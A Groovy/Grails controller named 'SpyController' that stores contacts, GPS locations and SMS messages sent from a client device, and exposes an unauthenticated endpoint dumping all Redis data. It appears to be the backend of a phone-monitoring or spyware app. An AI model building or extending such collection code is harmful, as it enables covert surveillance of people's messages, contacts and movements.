package com.xaviar

import static org.springframework.web.bind.annotation.RequestMethod.POST

import org.codehaus.jackson.JsonParseException
import org.codehaus.jackson.map.JsonMappingException
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference

import redis.clients.jedis.Jedis

import com.org.krams.domain.Contact
import com.org.krams.domain.Location
import com.org.krams.domain.Sms
import com.xaviar.market.rest.item.DataHolder

class SpyController {

	def redisService
	def contactService
	def locationService
	def smsService
	
	def createdata(DataHolder dataHolder) {

		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
		String clientGps = dataHolder.get(DataHolder.GPS);
		String clientSms = dataHolder.get(DataHolder.SMS);

		try {
			if (clientContacts != null) {
				ObjectMapper mapper = new ObjectMapper();
				List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
						});
				contactService.createAll(contacts);
			}

			if (clientGps != null) {
				ObjectMapper mapper = new ObjectMapper();
				List<Location> locations = mapper.readValue(clientGps,new TypeReference<List<Location>>() {
						});
				locationService.createAll(locations);
			}

			if (clientSms != null) {
				ObjectMapper mapper = new ObjectMapper();
				List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
						});
				smsService.createAll(smses);
			}

			final int id = 12;
			dataHolder.setID(id);

			[dataHolder:dataHolder]
		} catch (JsonParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (JsonMappingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	def getdata ={

			def DataHolder dataholder = new DataHolder();
			def Map<String, String> map = dataholder.getMap();
			def keys = redisService.withRedis { Jedis redis ->
				redis.keys("*");
			}

			for (key in keys) {
				def jsonData = redisService.withRedis { Jedis redis ->
					redis.get(key.toString());
				}

				if(jsonData!=null){
					map.put(key, jsonData);
				}
			}

			// print out data as json for test in the browser
			// render(contentType: 'text/json') {[dataholder:dataholder]}
			// also set urimappings.groovy action of getdata to GET :
			// action = [GET: "getdata"]

			[dataholder:dataholder]
		}
}
